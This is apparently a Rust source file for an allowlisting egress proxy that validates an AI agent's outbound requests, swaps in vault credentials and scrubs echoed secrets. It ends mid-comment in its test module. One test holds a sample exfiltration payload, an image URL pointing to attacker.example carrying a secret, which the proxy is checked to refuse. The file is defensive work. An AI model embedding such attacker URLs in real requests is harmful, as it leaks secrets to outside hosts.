//! The egress proxy: validated, allowlisted outbound requests.
//!
//! The proxy is the only component that touches the network on the
//! agent's behalf. Every request goes through the same pipeline:
//!
//! 1. **Surrogate validation.** The HMAC signature, expiry, peer-uid
//!    binding, and destination binding are all checked. A surrogate
//!    minted for a different peer or destination is rejected.
//! 2. **Allowlist check.** The destination must be on the operator's
//!    allowlist (exact match). Unknown destinations are refused before
//!    any connection is attempted.
//! 3. **Credential swap.** The real credential is fetched from the
//!    vault and placed in the `Authorization` header. The agent's
//!    surrogate never leaves the proxy; the real credential never
//!    leaves the proxy's memory (zeroized after use). A **public
//!    source** is the exception: it is only read (`GET`, no
//!    body), and the credential lookup is never consulted for it. So is
//!    a **keyless local endpoint**, which the operator marked
//!    as taking no credential. A credential that is empty is no
//!    credential: the destination is denied, never sent a bare
//!    `Bearer`.
//! 4. **Bounded forwarding.** The request is forwarded; the response
//!    is capped at [`MAX_RESPONSE_BYTES`]. An upstream that returns
//!    more is cut off — the proxy never OOMs on a malicious upstream.
//!    A **local model endpoint** is forwarded in plain HTTP to
//!    its pinned loopback addresses only, each connection's peer
//!    verified first ([`crate::local`]); every other destination over
//!    HTTPS.
//!
//! Every step is fail-closed. Failures are opaque to the agent.

use std::sync::Arc;

use zeroize::Zeroizing;

use crate::allowlist::Allowlist;
use crate::https::TlsClient;
use crate::surrogate::{SurrogateKey, ValidatedSurrogate, validate_surrogate};
use crate::{Error, Result};

/// Maximum upstream response body in bytes. Responses larger than this
/// are rejected — the proxy never buffers an unbounded upstream.
pub const MAX_RESPONSE_BYTES: usize = 1024 * 1024; // 1 MiB

/// Maximum request body in bytes. The agent cannot use the proxy to
/// exfiltrate unbounded data upstream.
pub const MAX_REQUEST_BYTES: usize = 1024 * 1024; // 1 MiB

/// An outbound HTTP request, as the agent describes it.
///
/// The agent names the method, destination, path, headers, and body.
/// It does NOT name credentials — those come from the surrogate swap.
#[derive(Debug, Clone)]
pub struct EgressRequest {
    /// HTTP method: `GET`, `POST`, `PUT`, `DELETE`, etc.
    pub method: String,
    /// Destination `host:port`, must match the surrogate's binding and
    /// the allowlist.
    pub destination: String,
    /// Request path, starting with `/`. No scheme, host, or userinfo.
    pub path: String,
    /// Request headers (name, value). `Authorization` is forbidden here
    /// — it comes from the credential swap.
    pub headers: Vec<(String, String)>,
    /// Request body bytes. Bounded by [`MAX_REQUEST_BYTES`].
    pub body: Vec<u8>,
    /// The surrogate authorizing this request.
    pub surrogate_b64: String,
}

/// An outbound HTTP response, as returned to the agent.
///
/// Carries the status, headers, and bounded body. Never carries
/// credentials — the swap is one-way.
#[derive(Debug, Clone)]
pub struct EgressResponse {
    /// HTTP status code.
    pub status: u16,
    /// Response headers.
    pub headers: Vec<(String, String)>,
    /// Response body, capped at [`MAX_RESPONSE_BYTES`].
    pub body: Vec<u8>,
}

/// The egress proxy.
///
/// Holds the surrogate HMAC key, the destination allowlist, and a
/// credential fetcher (the vault, via the broker). The HMAC key is
/// generated fresh for each proxy, so surrogates do not outlive it; the
/// allowlist can be shared, resolved once, by many proxies (see
/// [`Proxy::shared`]).
pub struct Proxy<F> {
    surrogate_key: SurrogateKey,
    allowlist: Arc<Allowlist>,
    /// Fetches the real credential for a destination. The closure
    /// receives the destination (`host:port`) and returns the
    /// credential bytes, or `None` if no credential is configured.
    /// The returned bytes are zeroized after the request completes.
    credential_fetcher: F,
    /// The HTTPS client and its one root store.
    tls: TlsClient,
}

impl<F> Proxy<F>
where
    F: Fn(&str) -> Option<Zeroizing<Vec<u8>>>,
{
    /// Constructs the proxy.
    ///
    /// Generates a fresh surrogate HMAC key. Parses the allowlist
    /// (fail-closed on invalid entries). HTTPS trusts the bundled roots
    /// only; [`Proxy::with_tls`] adds the operator's.
    ///
    /// # Errors
    ///
    /// Returns [`Error::InvalidAllowlist`] if the allowlist is
    /// malformed, or [`Error::Random`] if the OS will not provide
    /// randomness for the surrogate key.
    pub fn new(allowlist_raw: &str, credential_fetcher: F) -> Result<Self> {
        let allowlist = Arc::new(Allowlist::parse(allowlist_raw)?);
        Self::shared(allowlist, TlsClient::bundled()?, credential_fetcher)
    }

    /// A proxy over an allowlist already parsed and resolved, which other
    /// proxies may share, with `tls` as its HTTPS client.
    ///
    /// Only the surrogate HMAC key is new. A broker resolves its
    /// allowlist once and gives each session a proxy of its own over it,
    /// so no session resolves a destination again: what its DNS says
    /// later doesn't change the addresses its traffic goes to.
    ///
    /// # Errors
    ///
    /// Returns [`Error::Random`] if the OS will not provide randomness
    /// for the surrogate key.
    pub fn shared(
        allowlist: Arc<Allowlist>,
        tls: TlsClient,
        credential_fetcher: F,
    ) -> Result<Self> {
        Ok(Self {
            surrogate_key: SurrogateKey::generate()?,
            allowlist,
            credential_fetcher,
            tls,
        })
    }

    /// The allowlist this proxy checks destinations against.
    #[must_use]
    pub fn allowlist(&self) -> &Allowlist {
        &self.allowlist
    }

    /// The proxy, with `tls` as its HTTPS client: the operator's root
    /// store.
    #[must_use]
    pub fn with_tls(self, tls: TlsClient) -> Self {
        Self { tls, ..self }
    }

    /// Mints a surrogate for the given peer uid and destination.
    ///
    /// The destination must be on the allowlist — the broker checks the
    /// peer's grant first, then the proxy checks the allowlist here.
    /// Defense in depth: a grant for a non-allowlisted destination
    /// cannot produce a usable surrogate.
    ///
    /// # Errors
    ///
    /// Returns [`Error::DestinationDenied`] if the destination is not
    /// on the allowlist, or [`Error::InvalidSurrogate`] if the
    /// destination is malformed.
    pub fn mint_surrogate(
        &self,
        peer_uid: u32,
        destination: &str,
        ttl_secs: u64,
    ) -> Result<String> {
        if !self.allowlist.allows(destination) {
            return Err(Error::DestinationDenied);
        }
        crate::surrogate::mint_surrogate(&self.surrogate_key, peer_uid, destination, ttl_secs)
    }

    /// Forwards an egress request through the full validation pipeline.
    ///
    /// Validates the surrogate (signature, expiry, peer binding,
    /// destination binding), checks the allowlist, swaps in the real
    /// credential, forwards the request, and returns the bounded
    /// response.
    ///
    /// # Errors
    ///
    /// Returns [`Error::InvalidSurrogate`], [`Error::ExpiredSurrogate`],
    /// [`Error::PeerMismatch`], [`Error::DestinationMismatch`], or
    /// [`Error::DestinationDenied`] for validation failures;
    /// [`Error::UpstreamFailed`] or [`Error::ResponseTooLarge`] for
    /// forwarding failures. All are opaque to the agent.
    pub fn forward(&self, peer_uid: u32, request: &EgressRequest) -> Result<EgressResponse> {
        // 1. Surrogate validation: signature, expiry, format.
        let validated: ValidatedSurrogate =
            validate_surrogate(&self.surrogate_key, &request.surrogate_b64)?;

        // 2. Peer binding: the surrogate must have been minted for the
        // peer presenting it. A stolen surrogate from a different uid is
        // rejected here, even if the HMAC is valid.
        if validated.peer_uid != peer_uid {
            tracing::warn!(
                presenting_uid = peer_uid,
                surrogate_uid = validated.peer_uid,
                "egress surrogate peer mismatch"
            );
            return Err(Error::PeerMismatch);
        }

        // 3. Destination binding: the surrogate must have been minted
        // for the requested destination. Replay against a different
        // destination is rejected.
        if validated.destination != request.destination {
            tracing::warn!(
                requested = %request.destination,
                surrogate_dest = %validated.destination,
                "egress surrogate destination mismatch"
            );
            return Err(Error::DestinationMismatch);
        }

        // 4. Allowlist: the destination must be operator-approved. This
        // is checked at mint time too; re-checking here covers the case
        // where the allowlist changed between mint and use.
        if !self.allowlist.allows(&request.destination) {
            tracing::warn!(
                destination = %request.destination,
                "egress destination not on allowlist"
            );
            return Err(Error::DestinationDenied);
        }

        // 5. Request validation: method, path, headers, body bounds.
        validate_request(request)?;

        // 6. The model request policy: a model API is not asked to fetch
        // anything on the cell's behalf.
        crate::policy::check(
            &request.destination,
            &request.method,
            &request.path,
            &request.body,
        )
        .map_err(|reason| {
            tracing::warn!(
                destination = %request.destination,
                reason,
                "egress request refused by the model request policy"
            );
            Error::PolicyRefused { reason }
        })?;

        // 7. Credential swap: fetch the real credential for this
        // destination. The credential is zeroized after the request.
        let credential = self.credential_for(request)?;

        // 8. Forward the request, with the real credential if it has one:
        // a local model endpoint over its verified loopback connection,
        // anything else over HTTPS.
        let credential = credential.as_deref().map(Vec::as_slice);
        let mut response = if let Some(local) = self.allowlist.local(&request.destination) {
            crate::local::forward(local.addrs(), request, credential)?
        } else {
            let pinned = self
                .allowlist
                .addrs_for(&request.destination)
                .ok_or(Error::DestinationDenied)?;
            crate::https::forward(&self.tls, pinned, request, credential)?
        };

        // 9. Scrub: an upstream that echoes the credential must not hand
        // it to the cell.
        if credential.is_some_and(|credential| scrub_response(&mut response, credential)) {
            tracing::warn!(
                destination = %request.destination,
                "the upstream echoed the credential; it was scrubbed from the response"
            );
        }

        tracing::info!(
            peer_uid = peer_uid,
            destination = %request.destination,
            method = %request.method,
            status = response.status,
            "egress request forwarded"
        );
        Ok(response)
    }

    /// The credential the request goes out with.
    ///
    /// A public source is only read, and a keyless local endpoint was
    /// marked by the operator as taking none: neither consults the
    /// lookup. Every other destination must have a credential, and an
    /// empty one counts as none.
    fn credential_for(&self, request: &EgressRequest) -> Result<Option<Zeroizing<Vec<u8>>>> {
        if self.allowlist.is_public(&request.destination) {
            check_read_only(request)?;
            return Ok(None);
        }
        if self
            .allowlist
            .local(&request.destination)
            .is_some_and(crate::allowlist::Local::keyless)
        {
            return Ok(None);
        }
        match (self.credential_fetcher)(&request.destination) {
            Some(credential) if !credential.is_empty() => Ok(Some(credential)),
            Some(_) | None => {
                tracing::warn!(
                    destination = %request.destination,
                    "no credential configured for egress destination"
                );
                Err(Error::DestinationDenied)
            }
        }
    }
}

/// A public source is read, never written: `GET`, with no body.
/// Anything else is denied, before any connection.
fn check_read_only(request: &EgressRequest) -> Result<()> {
    if request.method == "GET" && request.body.is_empty() {
        Ok(())
    } else {
        tracing::warn!(
            destination = %request.destination,
            method = %request.method,
            "egress write to a public source denied"
        );
        Err(Error::DestinationDenied)
    }
}

/// Validates the agent-supplied request fields.
///
/// The method must be a known HTTP method. The path must start with `/`
/// and contain no scheme, host, or userinfo. The `Authorization` header
/// is forbidden (it comes from the swap). The body must be within
/// bounds.
/// Overwrites the credential wherever it appears in a response: its
/// header names and values, and its body. Whether it was there.
fn scrub_response(response: &mut EgressResponse, credential: &[u8]) -> bool {
    let mut found = crate::scrub::scrub(&mut response.body, credential);
    for (name, value) in &mut response.headers {
        found |= crate::scrub::scrub_text(name, credential);
        found |= crate::scrub::scrub_text(value, credential);
    }
    found
}

fn validate_request(request: &EgressRequest) -> Result<()> {
    // Method: allowlist of safe methods.
    if !matches!(
        request.method.as_str(),
        "GET" | "POST" | "PUT" | "DELETE" | "PATCH" | "HEAD" | "OPTIONS"
    ) {
        return Err(Error::InvalidSurrogate); // Opaque: don't leak why.
    }

    // Path: must start with '/', no scheme/host/userinfo.
    if !request.path.starts_with('/') {
        return Err(Error::InvalidSurrogate);
    }
    if request.path.contains(['?', '#']) {
        // Query strings and fragments are not supported in v0.1.
        // (They'd need careful encoding to avoid injection.)
        return Err(Error::InvalidSurrogate);
    }
    if request.path.contains("//") {
        // No path traversal via double slashes.
        return Err(Error::InvalidSurrogate);
    }

    // Headers: Authorization is forbidden (swap-only). Host is
    // forbidden (comes from the destination).
    for (name, _) in &request.headers {
        let lower = name.to_ascii_lowercase();
        if lower == "authorization" || lower == "host" {
            return Err(Error::InvalidSurrogate);
        }
    }

    // Body bound.
    if request.body.len() > MAX_REQUEST_BYTES {
        return Err(Error::InvalidSurrogate);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_proxy() -> Proxy<impl Fn(&str) -> Option<Zeroizing<Vec<u8>>>> {
        Proxy::new("internal:localhost:443", |_dest| {
            Some(Zeroizing::new(b"test-credential".to_vec()))
        })
        .unwrap()
    }

    /// The proxy takes the operator's root store whole.
    #[test]
    fn a_proxy_takes_its_tls_client_from_the_broker() {
        let bundled = test_proxy();
        assert_eq!(bundled.tls.operator_roots(), 0);
        let ca = crate::https::tests::pki("localhost").ca_pem;
        let tls = TlsClient::with_operator_bundle(ca.as_bytes()).unwrap();
        let proxy = test_proxy().with_tls(tls);
        assert_eq!(
            proxy.tls.operator_roots(),
            1,
            "the operator's client is the one used"
        );
        assert!(proxy.mint_surrogate(1000, "localhost:443", 3600).is_ok());
        let shown = format!("{:?}", proxy.tls);
        assert!(shown.contains("bundled_roots"), "{shown}");
    }

    #[test]
    fn proxies_built_over_one_allowlist_share_it_but_not_their_keys() {
        let allowlist = Arc::new(Allowlist::parse("internal:localhost:443").unwrap());
        let tls = TlsClient::bundled().unwrap();
        let first = Proxy::shared(Arc::clone(&allowlist), tls.clone(), |_: &str| None).unwrap();
        let second = Proxy::shared(Arc::clone(&allowlist), tls, |_: &str| None).unwrap();
        // One resolution, the same addresses: neither proxy parsed its own.
        assert!(std::ptr::eq(first.allowlist(), Arc::as_ptr(&allowlist)));
        assert!(std::ptr::eq(first.allowlist(), second.allowlist()));
        assert!(first.allowlist().allows("localhost:443"));
        // Each proxy mints with its own key: one's surrogate is no good to
        // the other.
        let surrogate = first.mint_surrogate(1000, "localhost:443", 3600).unwrap();
        assert!(validate_surrogate(&first.surrogate_key, &surrogate).is_ok());
        assert!(validate_surrogate(&second.surrogate_key, &surrogate).is_err());
        // `new` parses its own, over the bundled roots.
        let own = test_proxy();
        assert!(!std::ptr::eq(own.allowlist(), Arc::as_ptr(&allowlist)));
        assert!(own.allowlist().allows("localhost:443"));
        assert_eq!(own.tls.operator_roots(), 0);
    }

    #[test]
    fn mint_surrogate_requires_allowlisted_destination() {
        let proxy = test_proxy();
        // localhost:443 is allowlisted.
        assert!(proxy.mint_surrogate(1000, "localhost:443", 3600).is_ok());
        // example.com:443 is not.
        assert!(matches!(
            proxy.mint_surrogate(1000, "example.com:443", 3600),
            Err(Error::DestinationDenied)
        ));
    }

    /// The public source the mixed proxy reads: a name resolved, in the
    /// test, to an address in a documentation range (TEST-NET-3), which
    /// is public and leads nowhere.
    const PUBLIC_SOURCE: &str = "docs.example:443";

    /// A proxy over one public source and one credentialed
    /// destination, counting credential lookups.
    fn mixed_proxy(
        lookups: &Arc<std::sync::atomic::AtomicUsize>,
    ) -> Proxy<impl Fn(&str) -> Option<Zeroizing<Vec<u8>>>> {
        let lookups = Arc::clone(lookups);
        let allowlist = Allowlist::parse_with(
            "public:docs.example:443,internal:localhost:8443",
            |entry| match entry {
                "docs.example:443" => Ok(vec!["203.0.113.5:443".parse().unwrap()]),
                other => std::net::ToSocketAddrs::to_socket_addrs(other).map(Iterator::collect),
            },
        )
        .unwrap();
        Proxy::shared(
            Arc::new(allowlist),
            TlsClient::bundled().unwrap(),
            move |_dest: &str| {
                lookups.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                Some(Zeroizing::new(b"test-credential".to_vec()))
            },
        )
        .unwrap()
    }

    fn get(
        proxy: &Proxy<impl Fn(&str) -> Option<Zeroizing<Vec<u8>>>>,
        destination: &str,
    ) -> EgressRequest {
        EgressRequest {
            method: String::from("GET"),
            destination: destination.to_owned(),
            path: String::from("/"),
            headers: vec![],
            body: vec![],
            surrogate_b64: proxy.mint_surrogate(1000, destination, 3600).unwrap(),
        }
    }

    #[test]
    fn a_public_source_is_read_without_ever_consulting_the_credential_lookup() {
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = mixed_proxy(&lookups);
        // Nothing answers at the public source's address: the read gets
        // as far as the connection, which fails upstream, not as a denial.
        assert!(matches!(
            proxy.forward(1000, &get(&proxy, PUBLIC_SOURCE)),
            Err(Error::UpstreamFailed)
        ));
        assert_eq!(lookups.load(std::sync::atomic::Ordering::SeqCst), 0);
        // A credentialed destination still looks its credential up.
        assert!(proxy.forward(1000, &get(&proxy, "localhost:8443")).is_err());
        assert_eq!(lookups.load(std::sync::atomic::Ordering::SeqCst), 1);
    }

    /// A proxy over one local endpoint at `entry`, counting credential
    /// lookups and answering them with `credential`.
    fn local_proxy(
        entry: &str,
        credential: &'static [u8],
        lookups: &Arc<std::sync::atomic::AtomicUsize>,
    ) -> Proxy<impl Fn(&str) -> Option<Zeroizing<Vec<u8>>> + use<>> {
        let lookups = Arc::clone(lookups);
        Proxy::new(entry, move |_dest| {
            lookups.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            Some(Zeroizing::new(credential.to_vec()))
        })
        .unwrap()
    }

    const OK_REPLY: &[u8] = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok";

    #[test]
    fn a_keyless_local_endpoint_is_reached_without_a_credential() {
        let (live, server) = crate::local::tests::serve_once(OK_REPLY);
        let destination = format!("localhost:{}", live.port());
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = local_proxy(
            &format!("local-keyless:{destination}"),
            b"test-credential",
            &lookups,
        );
        let reply = proxy.forward(1000, &get(&proxy, &destination)).unwrap();
        assert_eq!((reply.status, reply.body.as_slice()), (200, &b"ok"[..]));
        assert_eq!(lookups.load(std::sync::atomic::Ordering::SeqCst), 0);
        let seen = String::from_utf8(server.join().unwrap()).unwrap();
        let expected = format!(
            "GET / HTTP/1.1\r\nHost: {destination}\r\nConnection: close\r\nAccept-Encoding: identity\r\nContent-Length: 0\r\n\r\n"
        );
        assert_eq!(seen, expected);
    }

    #[test]
    fn a_model_request_that_would_fetch_is_refused_before_it_leaves() {
        let (live, server) = crate::local::tests::serve_once(OK_REPLY);
        let destination = format!("localhost:{}", live.port());
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = local_proxy(
            &format!("local-keyless:{destination}"),
            b"test-credential",
            &lookups,
        );
        let post = |body: &[u8]| EgressRequest {
            method: String::from("POST"),
            path: String::from("/v1/chat/completions"),
            body: body.to_vec(),
            ..get(&proxy, &destination)
        };
        let fetching = br#"{"model":"m","messages":[{"role":"user","content":[{"type":"image_url","image_url":{"url":"https://attacker.example/?d=secret"}}]}]}"#;
        assert!(matches!(
            proxy.forward(1000, &post(fetching)),
            Err(Error::PolicyRefused { .. })
        ));
        // An ordinary one goes out, unchanged.
        let ordinary = br#"{"model":"m","messages":[{"role":"user","content":"hi"}]}"#;
        let reply = proxy.forward(1000, &post(ordinary)).unwrap();
        assert_eq!(reply.status, 200);
        let seen = server.join().unwrap();
        assert!(
            seen.ends_with(ordinary),
            "{}",
            String::from_utf8_lossy(&seen)
        );
        assert!(
            !String::from_utf8_lossy(&seen).contains("attacker"),
            "the refused request never left"
        );
    }

    #[test]
    fn a_credential_the_upstream_echoes_never_reaches_the_cell() {
        // The body is "echo: Bearer test-credential", 28 bytes.
        const ECHO: &[u8] = b"HTTP/1.1 400 Bad Request\r\nX-Echo: test-credential\r\nContent-Length: 28\r\n\r\necho: Bearer test-credential";
        let (live, server) = crate::local::tests::serve_once(ECHO);
        let destination = format!("localhost:{}", live.port());
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = local_proxy(
            &format!("local:{destination}"),
            b"test-credential",
            &lookups,
        );
        // The cell asks for a compressed answer, which would hide an echo.
        let mut request = get(&proxy, &destination);
        request
            .headers
            .push((String::from("Accept-Encoding"), String::from("gzip")));
        request
            .headers
            .push((String::from("TE"), String::from("gzip")));
        let reply = proxy.forward(1000, &request).unwrap();
        assert_eq!(reply.status, 400);
        assert_eq!(reply.body, b"echo: Bearer ***************".to_vec());
        assert!(
            reply
                .headers
                .contains(&(String::from("X-Echo"), String::from("***************"))),
            "{:?}",
            reply.headers
        );
        let seen = String::from_utf8(server.join().unwrap()).unwrap();
        assert!(seen.contains("\r\nAccept-Encoding: identity\r\n"), "{seen}");
        assert!(
            !seen.contains("gzip"),
            "the cell's encodings are dropped: {seen}"
        );
    }

    #[test]
    fn a_compressed_answer_is_refused_since_it_cannot_be_scrubbed() {
        const GZIP: &[u8] =
            b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nContent-Length: 2\r\n\r\nok";
        const IDENTITY: &[u8] =
            b"HTTP/1.1 200 OK\r\nContent-Encoding: identity\r\nContent-Length: 2\r\n\r\nok";
        let (live, server) = crate::local::tests::serve_once(GZIP);
        let destination = format!("localhost:{}", live.port());
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = local_proxy(
            &format!("local:{destination}"),
            b"test-credential",
            &lookups,
        );
        assert!(matches!(
            proxy.forward(1000, &get(&proxy, &destination)),
            Err(Error::UpstreamFailed)
        ));
        server.join().unwrap();
        // An explicit identity encoding is fine.
        let (live, server) = crate::local::tests::serve_once(IDENTITY);
        let destination = format!("localhost:{}", live.port());
        let proxy = local_proxy(
            &format!("local:{destination}"),
            b"test-credential",
            &lookups,
        );
        let reply = proxy.forward(1000, &get(&proxy, &destination)).unwrap();
        assert_eq!(reply.body, b"ok");
        server.join().unwrap();
    }

    #[test]
    fn scrub_response_masks_the_body_and_every_header_name_and_value() {
        let mut response = EgressResponse {
            status: 200,
            headers: vec![
                (String::from("X-test-credential"), String::from("a")),
                (
                    String::from("X-B"),
                    String::from("pre test-credential post"),
                ),
                (String::from("X-C"), String::from("clean")),
            ],
            body: b"test-credentialtest-credential".to_vec(),
        };
        assert!(scrub_response(&mut response, b"test-credential"));
        assert_eq!(
            response.headers,
            [
                (String::from("X-***************"), String::from("a")),
                (
                    String::from("X-B"),
                    String::from("pre *************** post")
                ),
                (String::from("X-C"), String::from("clean")),
            ]
        );
        assert_eq!(response.body, b"******************************".to_vec());
        // Nothing to scrub: nothing changes, and it says so.
        let mut clean = EgressResponse {
            status: 200,
            headers: vec![(String::from("X"), String::from("y"))],
            body: b"fine".to_vec(),
        };
        assert!(!scrub_response(&mut clean, b"test-credential"));
        assert_eq!(clean.body, b"fine".to_vec());
    }

    #[test]
    fn a_keyed_local_endpoint_carries_the_vault_credential() {
        let (live, server) = crate::local::tests::serve_once(OK_REPLY);
        let destination = format!("localhost:{}", live.port());
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = local_proxy(
            &format!("local:{destination}"),
            b"test-credential",
            &lookups,
        );
        let reply = proxy.forward(1000, &get(&proxy, &destination)).unwrap();
        assert_eq!(reply.body, b"ok");
        assert_eq!(lookups.load(std::sync::atomic::Ordering::SeqCst), 1);
        let seen = String::from_utf8(server.join().unwrap()).unwrap();
        assert!(
            seen.contains("\r\nAuthorization: Bearer test-credential\r\n"),
            "got {seen}"
        );
    }

    #[test]
    fn an_empty_credential_is_no_credential() {
        // Nothing listens on either destination: an empty credential is
        // denied before any connection, where sending would have failed
        // upstream.
        let dead = crate::local::tests::dead_addr().port();
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = local_proxy(
            &format!("internal:localhost:443,local:localhost:{dead}"),
            b"",
            &lookups,
        );
        for destination in [String::from("localhost:443"), format!("localhost:{dead}")] {
            assert!(
                matches!(
                    proxy.forward(1000, &get(&proxy, &destination)),
                    Err(Error::DestinationDenied)
                ),
                "{destination}"
            );
        }
        assert_eq!(lookups.load(std::sync::atomic::Ordering::SeqCst), 2);
        // A credential present but unreachable fails upstream, not denied.
        let keyed = local_proxy(&format!("local:localhost:{dead}"), b"k", &lookups);
        let destination = format!("localhost:{dead}");
        assert!(matches!(
            keyed.forward(1000, &get(&keyed, &destination)),
            Err(Error::UpstreamFailed)
        ));
    }

    #[test]
    fn a_public_source_is_never_written() {
        let lookups = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let proxy = mixed_proxy(&lookups);
        let mut post = get(&proxy, PUBLIC_SOURCE);
        post.method = String::from("POST");
        assert!(matches!(
            proxy.forward(1000, &post),
            Err(Error::DestinationDenied)
        ));
        let mut with_body = get(&proxy, PUBLIC_SOURCE);
        with_body.body = b"x".to_vec();
        assert!(matches!(
            proxy.forward(1000, &with_body),
            Err(Error::DestinationDenied)
        ));
        assert_eq!(lookups.load(std::sync::atomic::Ordering::SeqCst), 0);
    }

    #[test]
    fn forward_rejects_peer_mismatch() {
        let proxy = test_proxy();
        let surrogate = proxy.mint_surrogate(1000, "localhost:443", 3600).unwrap();
        let request = EgressRequest {
            method: String::from("GET"),
            destination: String::from("localhost:443"),
            path: String::from("/"),
            headers: vec![],
            body: vec![],
            surrogate_b64: surrogate,
        };
        // Presenting as uid 2000, but the surrogate was minted for 1000.
        assert!(matches!(
            proxy.forward(2000, &request),
            Err(Error::PeerMismatch)
        ));
    }

    #[test]
    fn forward_rejects_destination_mismatch() {
        let proxy = Proxy::new("internal:localhost:443,internal:localhost:8443", |_dest| {
            Some(Zeroizing::new(b"test-credential".to_vec()))
        })
        .unwrap();
        let surrogate = proxy.mint_surrogate(1000, "localhost:443", 3600).unwrap();
        let request = EgressRequest {
            method: String::from("GET"),
            destination: String::from("localhost:8443"), // Different!
            path: String::from("/"),
            headers: vec![],
            body: vec![],
            surrogate_b64: surrogate,
        };
        assert!(matches!(
            proxy.forward(1000, &request),
            Err(Error::DestinationMismatch)
        ));
    }

    #[test]
    fn forward_rejects_authorization_header() {
        let proxy = test_proxy();
        let surrogate = proxy.mint_surrogate(1000, "localhost:443", 3600).unwrap();
        let request = EgressRequest {
            method: String::from("GET"),
            destination: String::from("localhost:443"),
            path: String::from("/"),
            headers: vec![(String::from("Authorization"), String::from("Bearer evil"))],
            body: vec![],
            surrogate_b64: surrogate,
        };
        // The agent cannot set Authorization; it's swap-only.
        assert!(proxy.forward(1000, &request).is_err());
    }

    #[test]
    fn forward_rejects_invalid_method() {
        let proxy = test_proxy();
        let surrogate = proxy.mint_surrogate(1000, "localhost:443", 3600).unwrap();
        let request = EgressRequest {
            method: String::from("TRACE"), // Not allowlisted.
            destination: String::from("localhost:443"),
            path: String::from("/"),
            headers: vec![],
            body: vec![],
            surrogate_b64: surrogate,
        };
        assert!(proxy.forward(1000, &request).is_err());
    }

    /// The size constants are exactly 1 MiB (1024 * 1024). Pins the
    /// `*` → `+`/`/` mutants on both constants.
    #[test]
    fn size_constants_are_one_mib() {
        assert_eq!(MAX_RESPONSE_BYTES, 1024 * 1024);
        assert_eq!(MAX_REQUEST_BYTES, 1024 * 1024);
    }

    /// `validate_request` accepts a well-formed request. Pins the
    /// `Ok(())` replacement mutant (which would accept everything) and
    /// the `>` → `<` mutant on the body bound (empty body must pass).
    #[test]
    fn validate_request_accepts_valid() {
        let request = EgressRequest {
            method: String::from("GET"),
            destination: String::from("localhost:443"),
            path: String::from("/api/v1"),
            headers: vec![(String::from("X-Custom"), String::from("value"))],
            body: vec![],
            surrogate_b64: String::from("unused"),
        };
        assert!(validate_request(&request).is_ok());
    }

    /// `validate_request` rejects unknown methods. Pins the `!`
    /// deletion on the method allowlist (which would invert it).
    #[test]
    fn validate_request_rejects_bad_method() {
        for bad_method in ["TRACE", "CONNECT", "get", "", "GET "] {
            let request = EgressRequest {
                method: String::from(bad_method),
                destination: String::from("localhost:443"),
                path: String::from("/"),
                headers: vec![],
                body: vec![],
                surrogate_b64: String::from("unused"),
            };
            assert!(
                validate_request(&request).is_err(),
                "method {bad_method:?} should be rejected"
            );
        }
    }

    /// `validate_request` accepts all seven allowlisted methods. Each
    /// is named explicitly so the per-arm deletion mutants are pinned.
    #[test]
    fn validate_request_accepts_all_methods() {
        for method in ["GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"] {
            let request = EgressRequest {
                method: String::from(method),
                destination: String::from("localhost:443"),
                path: String::from("/"),
                headers: vec![],
                body: vec![],
                surrogate_b64: String::from("unused"),
            };
            assert!(
                validate_request(&request).is_ok(),
                "method {method:?} should be accepted"
            );
        }
    }

    /// `validate_request` rejects paths not starting with '/'. Pins
    /// the `!` deletion on the path check.
    #[test]
    fn validate_request_rejects_bad_path() {
        for bad_path in ["", "no-slash", "https://example.com/", "//double"] {
            let request = EgressRequest {
                method: String::from("GET"),
                destination: String::from("localhost:443"),
                path: String::from(bad_path),
                headers: vec![],
                body: vec![],
                surrogate_b64: String::from("unused"),
            };
            assert!(
                validate_request(&request).is_err(),
                "path {bad_path:?} should be rejected"
            );
        }
        // Query strings and fragments are rejected.
        for bad_path in ["/path?query", "/path#fragment"] {
            let request = EgressRequest {
                method: String::from("GET"),
                destination: String::from("localhost:443"),
                path: String::from(bad_path),
                headers: vec![],
                body: vec![],
                surrogate_b64: String::from("unused"),
            };
            assert!(
                validate_request(&request).is_err(),
                "path {bad_path:?} should be rejected"
            );
        }
    }

    /// `validate_request` rejects `Authorization` and `Host` headers
    /// (case-insensitive). Pins the `||` → `&&` and `==` → `!=`
    /// mutants on the header check.
    #[test]
    fn validate_request_rejects_forbidden_headers() {
        for forbidden in [
            "Authorization",
            "authorization",
            "AUTHORIZATION",
            "Host",
            "host",
            "HOST",
        ] {
            let request = EgressRequest {
                method: String::from("GET"),
                destination: String::from("localhost:443"),
                path: String::from("/"),
                headers: vec![(String::from(forbidden), String::from("value"))],
                body: vec![],
                surrogate_b64: String::from("unused"),
            };
            assert!(
                validate_request(&request).is_err(),
                "header {forbidden:?} should be rejected"
            );
        }
    }

    /// `validate_request` rejects bodies larger than 1 MiB, but
    /// accepts exactly 1 MiB. Pins `>` vs `==`/`>=` on the body bound.
    #[test]
    fn validate_request_body_bound() {
        // Exactly 1 MiB: `len() > MAX` is false, must be accepted.
        // (With `>=` or `==` it would be rejected.)
        let request = EgressRequest {
            method: String::from("POST"),
            destination: String::from("localhost:443"),
            path: String::from("/"),
            headers: vec![],
            body: vec![0u8; MAX_REQUEST_BYTES],
            surrogate_b64: String::from("unused"),
        };
        assert!(validate_request(&request).is_ok());
        // 1 MiB + 1: must be rejected.
        let request = EgressRequest {
            method: String::from("POST"),
            destination: String::from("localhost:443"),
            path: String::from("/"),
            headers: vec![],
            body: vec![0u8; MAX_REQUEST_BYTES + 1],
            surrogate_b64: String::from("unused"),
        };
        assert!(validate_request(&request).is_err());
    }

    /// The method dispatch in `do_forward` handles all seven methods.
    /// Each method is exercised through `forward`; the upstream
